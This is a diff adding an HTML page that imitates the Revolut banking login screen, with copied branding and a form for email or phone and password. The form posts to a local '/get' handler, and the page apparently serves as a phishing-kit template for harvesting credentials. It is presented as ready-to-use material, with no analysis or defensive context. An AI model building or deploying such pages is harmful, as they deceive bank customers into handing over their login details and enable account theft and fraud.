@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Revolut</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Inter', 'Helvetica Neue', Arial, sans-serif;
+        background-color: #0075eb;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 400px;
+        text-align: center;
+      }
+      #logo {
+        margin-bottom: 32px;
+      }
+      .g-h1 {
+        font-size: 28px;
+        font-weight: 700;
+        color: #fff;
+        margin-bottom: 8px;
+      }
+      .g-h2 {
+        font-size: 16px;
+        color: rgba(255,255,255,0.7);
+        margin-bottom: 32px;
+      }
+      .g-input {
+        width: 100%;
+        padding: 16px;
+        border: 2px solid rgba(255,255,255,0.3);
+        border-radius: 12px;
+        font-size: 16px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+        background: rgba(255,255,255,0.1);
+        color: #fff;
+      }
+      .g-input:focus {
+        border-color: #fff;
+      }
+      .g-input::placeholder {
+        color: rgba(255,255,255,0.5);
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 16px;
+        background-color: #fff;
+        color: #0075eb;
+        border: none;
+        border-radius: 12px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+      }
+      .gbtn-primary:hover {
+        background: #e6e6e6;
+      }
+      .link {
+        display: block;
+        margin-top: 20px;
+        color: #fff;
+        font-size: 14px;
+        text-decoration: none;
+      }
+      .link:hover {
+        text-decoration: underline;
+      }
+      .footer {
+        margin-top: 32px;
+        font-size: 13px;
+        color: rgba(255,255,255,0.6);
+      }
+      .footer a {
+        color: #fff;
+        text-decoration: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <svg id="logo" viewBox="0 0 120 40" width="120" height="40">
+        <text x="50%" y="32" text-anchor="middle" font-family="Arial" font-weight="800" font-size="32" fill="#fff">Revolut</text>
+      </svg>
+      <h1 class="g-h1">Welcome to Revolut</h1>
+      <p class="g-h2">Enter your phone number or email</p>
+      <form action="/get" method="POST">
+        <input class="g-input" type="text" name="email" placeholder="Phone number or email" required>
+        <input class="g-input" type="password" name="password" placeholder="Password">
+        <button type="submit" class="gbtn-primary">Continue</button>
+      </form>
+      <a href="#" class="link">Log in with phone number</a>
+      <p class="footer">Don't have an account? <a href="#">Sign Up</a></p>
+    </div>
+  </body>
+</html>
